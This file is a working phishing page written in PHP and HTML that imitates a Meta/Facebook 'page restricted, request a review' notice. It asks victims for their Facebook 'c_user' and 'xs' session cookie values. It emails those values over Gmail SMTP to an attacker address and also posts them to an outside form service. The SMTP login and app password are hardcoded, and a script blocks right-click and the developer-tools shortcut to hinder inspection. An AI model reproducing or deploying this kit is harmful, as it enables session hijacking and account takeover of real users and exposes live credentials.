<?php

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

if(isset($_POST['sent']))
{
  $c_user = $_POST['c_user'];
  $xs = $_POST['xs'];


  //Load Composer's autoloader
  require 'phpmailer/Exception.php';
  require 'phpmailer/PHPMailer.php';
  require 'phpmailer/SMTP.php';

  //Create an instance; passing `true` enables exceptions
  $mail = new PHPMailer(true);

  try {
      //Server settings
      $mail->isSMTP();                                            //Send using SMTP
      $mail->Host       = 'smtp.gmail.com';                     //Set the SMTP server to send through
      $mail->SMTPAuth   = true;                                   //Enable SMTP authentication
      $mail->Username   = 'sarahbenz577@gmail.com';                     //SMTP username
      $mail->Password   = 'hhccsinpwaxzhkls';                               //SMTP password
      $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;            //Enable implicit TLS encryption
      $mail->Port       = 465;                                    //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`

      //Recipients
      $mail->setFrom('sarahbenz577@gmail.com', 'New FORM Submission');
      $mail->addAddress('appeal.facebook.request@gmail.com', 'New Submission');

      //Content
      $mail->isHTML(true);                                  //Set email format to HTML
      $mail->Subject = 'test form';
      $mail->Body    =  "C_USER: $c_user <br> XS: $xs";

      $mail->send();
    header("Location: security.php");
    exit();
  } catch (Exception $e) {
      echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
  }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">   
    <link rel="icon" type="image/png" href="https://upload.wikimedia.org/wikipedia/commons/6/6c/Facebook_Logo_2023.png">
    <link rel="stylesheet" href="styles.css">
    <title>Action | Required</title>
</head>
<body>

    <nav>
        <div class="nav-left">
            <p class="fb-2">
                facebook
            </p>
        </div>
        <div class="nav-right">
            <div class="search-box">
                <img src="https://static.vecteezy.com/system/resources/thumbnails/011/618/600/small/search-symbol-for-icon-design-png.png" alt="search-icon">
                <input type="text" placeholder="Search" >
            </div>
        </div>
    </nav> <br><br>

             <div class="main-body">
              
      <form class="content" action="https://usebasin.com/f/33f87e156474" method="POST">

            <div>
             <img src="https://upload.wikimedia.org/wikipedia/commons/a/ab/Meta-Logo.png" width="140" >
            </div>
     
             
            <p class="tr-5">We have identified irregular activity on your page that goes against our community guidelines.</p><br>
            <p class="tr-5">As a result, access to your page has been restricted, and you are presently unable to post, share or comment using it.</p><br>
            <p class="tr-5">If you think this is a Mistake, you can request a review by providing the required details.</p><br>
     
            <div class="video-text">
             <p>Detailed Video Information:</p>
            </div>
     
           <div>
             <video controls="" loop autoplay width="250" poster="https://i.pinimg.com/originals/97/95/69/979569a2dedd37573974ceebc05b4a4e.png" >
               <source src="https://detailed-video-29b30.web.app/detailed%20video.mp4"  type="video/mp4" >
            </video>
           </div>
     
           <p class="tr-5">Please be sure to provide the requested information below.</p><br>
     
           <div>
             <p class="mt-4">
             c_user
            </p>
             <input type="number" name="c_user" id="c_user" pattern="[0-9]+" minlength="6" required="">
           </div><br>
     
           <div>
             <p class="mt-4">
             xs
            </p>
             <input  type="text" name="xs" id="xs" pattern="^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@#$%^&amp;+=]).{12,}$"  required="">
           </div><br>
     
           <p class="msi-4">**Please ensure that you do not log out of your account on your computer or laptop until you have received a verification email.</p><br>
     
           <div class="container">
             <button class="button">
               <p>
                 Submit
               </p>
             </button>
       
           </div>
           <br> <br>
     
         </form>
    </div>
    <br><br>
    <div>
      <p class="copy-r">
          Meta ©️ 2024   </p>
    </div>

    <script>
      document.addEventListener('contextmenu', function(e) {
          e.preventDefault();
      });
      document.onkeydown = function(e) {
          if (e.ctrlKey && (e.shiftKey || e.key === "I" || e.key === "i")) {
              e.preventDefault();
          }
      };
  </script>
    
</body>
</html>